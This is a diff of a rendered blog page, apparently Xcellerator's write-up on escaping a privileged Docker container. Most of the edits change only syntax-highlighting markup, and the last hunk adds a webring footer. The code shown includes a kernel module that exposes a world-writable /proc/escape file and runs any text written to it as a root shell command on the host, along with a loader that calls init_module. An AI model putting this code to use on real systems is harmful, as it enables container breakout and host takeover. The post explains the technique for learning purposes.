@@ -186,10 +186,10 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kernel.h&gt;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/proc_fs.h&gt;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>MODULE_LICENSE(<span style="color:#e6db74">&#34;GPL&#34;</span>);
-</span></span><span style="display:flex;"><span>MODULE_AUTHOR(<span style="color:#e6db74">&#34;Xcellerator&#34;</span>);
-</span></span><span style="display:flex;"><span>MODULE_DESCRIPTION(<span style="color:#e6db74">&#34;Simple Procfs&#34;</span>);
-</span></span><span style="display:flex;"><span>MODULE_VERSION(<span style="color:#e6db74">&#34;0.01&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MODULE_LICENSE</span>(<span style="color:#e6db74">&#34;GPL&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MODULE_AUTHOR</span>(<span style="color:#e6db74">&#34;Xcellerator&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MODULE_DESCRIPTION</span>(<span style="color:#e6db74">&#34;Simple Procfs&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MODULE_VERSION</span>(<span style="color:#e6db74">&#34;0.01&#34;</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * This struct will store all the information about the entry
@@ -199,7 +199,7 @@
 </span></span><span style="display:flex;"><span><span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * We need a function to handle writes to /proc/simple
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
-</span></span><span style="display:flex;"><span>ssize_t <span style="color:#a6e22e">simple_write</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf, size_t len, loff_t <span style="color:#f92672">*</span>offset)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">ssize_t</span> <span style="color:#a6e22e">simple_write</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">size_t</span> len, <span style="color:#66d9ef">loff_t</span> <span style="color:#f92672">*</span>offset)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* handle a write */</span>
 </span></span><span style="display:flex;"><span>    
@@ -209,7 +209,7 @@
 </span></span><span style="display:flex;"><span><span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * We need a function to handle reads from /proc/simple
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
-</span></span><span style="display:flex;"><span>ssize_t <span style="color:#a6e22e">simple_read</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf, size_t len, loff_t <span style="color:#f92672">*</span>offset)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">ssize_t</span> <span style="color:#a6e22e">simple_read</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">size_t</span> len, <span style="color:#66d9ef">loff_t</span> <span style="color:#f92672">*</span>offset)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* handle a read */</span>
 </span></span><span style="display:flex;"><span>
@@ -234,7 +234,7 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Install the proc file with permissions 0666 (so we can read/write to it)
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
-</span></span><span style="display:flex;"><span>    proc_file_entry_simple <span style="color:#f92672">=</span> proc_create(<span style="color:#e6db74">&#34;simple&#34;</span>, <span style="color:#ae81ff">0666</span>, NULL, <span style="color:#f92672">&amp;</span>proc_file_fops_simple);
+</span></span><span style="display:flex;"><span>    proc_file_entry_simple <span style="color:#f92672">=</span> <span style="color:#a6e22e">proc_create</span>(<span style="color:#e6db74">&#34;simple&#34;</span>, <span style="color:#ae81ff">0666</span>, NULL, <span style="color:#f92672">&amp;</span>proc_file_fops_simple);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Check it didn&#39;t fail
@@ -253,14 +253,14 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Uninstall the proc file
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
-</span></span><span style="display:flex;"><span>    remove_proc_entry(<span style="color:#e6db74">&#34;simple&#34;</span>, NULL);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">remove_proc_entry</span>(<span style="color:#e6db74">&#34;simple&#34;</span>, NULL);
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Declare the init and exit functions
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
-</span></span><span style="display:flex;"><span>module_init(simple_init);
-</span></span><span style="display:flex;"><span>module_exit(simple_exit);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module_init</span>(simple_init);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module_exit</span>(simple_exit);
 </span></span></code></pre></div><blockquote>
 <p>If you&rsquo;d like to learn more about Linux kernel modules (particularly from a rootkit viewpoint), I have an ongoing series of posts starting <a href="../linux_rootkits_01/">here</a>.</p>
 </blockquote>
@@ -280,7 +280,7 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * When /proc/escape is written to, a buffer containing the bytes are passed
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * to the escape_write() as well as the length of that buffer
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
-</span></span><span style="display:flex;"><span>ssize_t <span style="color:#a6e22e">escape_write</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf, size_t len, loff_t <span style="color:#f92672">*</span>offset)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">ssize_t</span> <span style="color:#a6e22e">escape_write</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">size_t</span> len, <span style="color:#66d9ef">loff_t</span> <span style="color:#f92672">*</span>offset)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> ret;
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>kbuf <span style="color:#f92672">=</span> NULL;
@@ -299,8 +299,8 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * copy_from_user() is similar to memcpy() and is used to copy data
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * from a userspace buffer into a kernel one.
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
-</span></span><span style="display:flex;"><span>    kbuf <span style="color:#f92672">=</span> kzalloc(len, GFP_KERNEL);
-</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> copy_from_user(kbuf, buf, len<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    kbuf <span style="color:#f92672">=</span> <span style="color:#a6e22e">kzalloc</span>(len, GFP_KERNEL);
+</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(kbuf, buf, len<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(error)
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
@@ -316,14 +316,14 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
 </span></span><span style="display:flex;"><span>    argv[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/bin/sh&#34;</span>;
 </span></span><span style="display:flex;"><span>    argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;-c&#34;</span>;
-</span></span><span style="display:flex;"><span>    argv[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> kzalloc(len<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>, GFP_KERNEL);
+</span></span><span style="display:flex;"><span>    argv[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">kzalloc</span>(len<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>, GFP_KERNEL);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Copy the kernel buffer (containing the command to execute) into argv[2]
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * (We have to chop off the &#39;\n&#39;, so only copy len-1 bytes)
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
-</span></span><span style="display:flex;"><span>    strncpy(argv[<span style="color:#ae81ff">2</span>], kbuf, len<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
-</span></span><span style="display:flex;"><span>    strcat(argv[<span style="color:#ae81ff">2</span>], suffix);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strncpy</span>(argv[<span style="color:#ae81ff">2</span>], kbuf, len<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcat</span>(argv[<span style="color:#ae81ff">2</span>], suffix);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Finally execute the command stored in argv
@@ -331,13 +331,13 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * handle_cmd() is a helper function that just checks that argv[0] isn&#39;t
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * empty and then calls call_usermodehelper() directly
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
-</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> handle_cmd();
+</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">handle_cmd</span>();
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Lastly, just free the buffers and return the number of bytes written (len)
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
-</span></span><span style="display:flex;"><span>    kfree(kbuf);
-</span></span><span style="display:flex;"><span>    kfree(command);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">kfree</span>(kbuf);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">kfree</span>(command);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> len;
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
@@ -358,7 +358,7 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Execute the command in argv[]
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
-</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> call_usermodehelper(argv[<span style="color:#ae81ff">0</span>], argv, envp, UMH_WAIT_EXEC);
+</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">call_usermodehelper</span>(argv[<span style="color:#ae81ff">0</span>], argv, envp, UMH_WAIT_EXEC);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ret;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>If you read the above function carefully, you&rsquo;ll have noticed that the output of any command passed to <code>/bin/sh</code> is redirected to <code>/proc/output</code>. The reason for this is we have to redirect somewhere <em>relative to the host&rsquo;s root</em>, and <em>not the container</em>. We neither know where the root of the container is on the host, nor can we read anything outside of the container. We need a file that both the host and the container can read/write to - so let&rsquo;s just create another proc file!</p>
@@ -405,11 +405,11 @@
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> result;
-</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> init_module(escape_ko, escape_ko_len, args);
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#a6e22e">init_module</span>(escape_ko, escape_ko_len, args);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (result <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
 </span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;Error: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, result);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Error: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, result);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
@@ -476,6 +476,21 @@
 
 <script src="/assets/main.js"></script>
 <script src="/assets/prism.js"></script>
+
+<div class="footer__webring">
+    <span>
+        <div>
+            this site is part of the <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi'>HauNTed wEbriNg</a>
+        </div>
+        <div>
+            <p>
+                <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi?before=https://xcellerator.github.io/'>&lt;&lt;&lt;</a>
+                <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi?random=https://xcellerator.github.io/'>RaNDom</a>
+                <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi?after=https://xcellerator.github.io/'>&gt;&gt;&gt;</a>
+            </p>
+        </div>
+    </span>
+</div>
 
 
 
